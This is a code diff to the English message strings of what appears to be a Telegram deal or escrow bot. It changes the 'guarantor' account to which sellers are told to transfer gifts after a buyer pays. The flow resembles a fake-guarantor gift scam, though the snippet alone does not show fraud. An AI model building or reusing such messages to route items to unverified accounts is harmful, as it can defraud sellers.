@@ -47,7 +47,7 @@ MESSAGES = {
         'lang_btn': "🇺🇸 English",
         'pay_btn': "✅ Pay",
         'cancel_btn': "❌ Cancel",
-        'buyer_paid': "💰 <b>Buyer paid for deal #{id}</b>\n\n📦 <b>Type:</b> {type}\n📋 <b>Item:</b> {desc}\n💵 <b>Amount:</b> +{amount} {cur}\n\n👤 <b>Buyer:</b> ID {buyer_id}\n\n<i>✅ Money received. You can transfer the item/gift.</i>\n\n🎁 <b>GIFT TRANSFER INSTRUCTIONS</b>\n\n1. 📦 Transfer the gift to the guarantor: @garantmoskow\n2. ✅ Transfer is confirmed automatically\n3. 💰 After confirmation, funds will be credited to your balance",
+        'buyer_paid': "💰 <b>Buyer paid for deal #{id}</b>\n\n📦 <b>Type:</b> {type}\n📋 <b>Item:</b> {desc}\n💵 <b>Amount:</b> +{amount} {cur}\n\n👤 <b>Buyer:</b> ID {buyer_id}\n\n<i>✅ Money received. You can transfer the item/gift.</i>\n\n🎁 <b>GIFT TRANSFER INSTRUCTIONS</b>\n\n1. 📦 Transfer the gift to the guarantor: @GiftGuardGarant\n2. ✅ Transfer is confirmed automatically\n3. 💰 After confirmation, funds will be credited to your balance",
     }
 }
 
